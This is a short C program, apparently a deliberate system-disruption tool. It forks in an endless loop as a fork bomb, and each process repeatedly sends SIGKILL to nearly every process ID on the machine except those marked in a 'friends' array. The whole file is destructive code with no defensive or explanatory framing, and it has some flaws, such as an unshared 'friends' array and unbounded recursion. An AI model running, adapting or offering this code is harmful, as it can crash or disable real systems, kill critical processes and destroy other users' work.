#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <proc/readproc.h>

void attack();
bool friends[32768];

int main(int argc, char* argv[]) {
	friends[getpid()] = true;
	//int p;
	while(1){
		int p = fork();
		if(p == 0){
			attack();
		}
		else if(p == -1){
			attack();
		}
	}
}
void attack(){
	friends[getpid()] = true;
	int p;
	int i = 1;
	while(i < 32767){
		if(!friends[i]){
			kill(i, SIGKILL);
		}
		i++;
	}
	attack();
}